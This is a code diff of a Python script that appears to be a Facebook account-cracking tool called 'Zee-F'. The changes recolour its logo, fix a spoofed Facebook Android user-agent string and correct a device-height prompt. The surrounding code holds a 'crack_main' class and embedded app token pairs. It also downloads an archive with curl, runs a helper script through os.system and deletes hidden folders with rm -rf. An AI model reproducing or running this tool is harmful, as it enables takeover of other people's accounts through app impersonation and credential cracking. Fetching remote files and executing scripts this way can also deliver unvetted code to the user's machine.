@@ -26,7 +26,7 @@ if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
         os.system('clear')
         print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
         os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
-        os.system('python jan.py')
+        os.system('python zia.py')
 else:
         akk2="rsi"
         akk=f"cha{akk2}fi"
@@ -91,15 +91,19 @@ os.system("rm -rf .f1")
 os.system("rm -rf .f2")
 
 logo= f'''
-8888P 888888 888888 
-  dP  88__   88__   
- dP   88""   88""   
-d8888 888888 888888 
-{50*"="}
+
+\033[1;35m ________   _______  _______\033[1;37m 
+\033[1;31m|       /  |   ____||   ____|\033[1;37m
+\033[1;31m`---/  /   |  |__   |  |__   \033[1;37m
+\033[1;35m   /  /    |   __|  |   __|  \033[1;37m
+\033[1;35m  /  /----.|  |____ |  |____ \033[1;37m
+\033[1;34m /________||_______||_______|\033[1;37m
+
+\033[1;35m{50*"="}
     Tool Version :     1.0.0
     Type         :     Personal
     Name         :     Zee-F
-{50*"="}'''
+{50*"="}'''\033[1;37m
 
 #--(Dark@Colours)---#
 r="\033[1;91m"
@@ -384,7 +388,7 @@ class crack_main():
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
+                                uas = 'Dalvik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
                                 fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
                                 abhi = "5531728|62f8ce9"
@@ -431,7 +435,7 @@ class crack_main():
                         width_=input(" device width : ")
                         print(44*'=')
                         print(" your mobile height ex 1660,1780,1730 etc")
-                        height_=input(" device company name : ")
+                        height_=input(" device height : ")
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo)
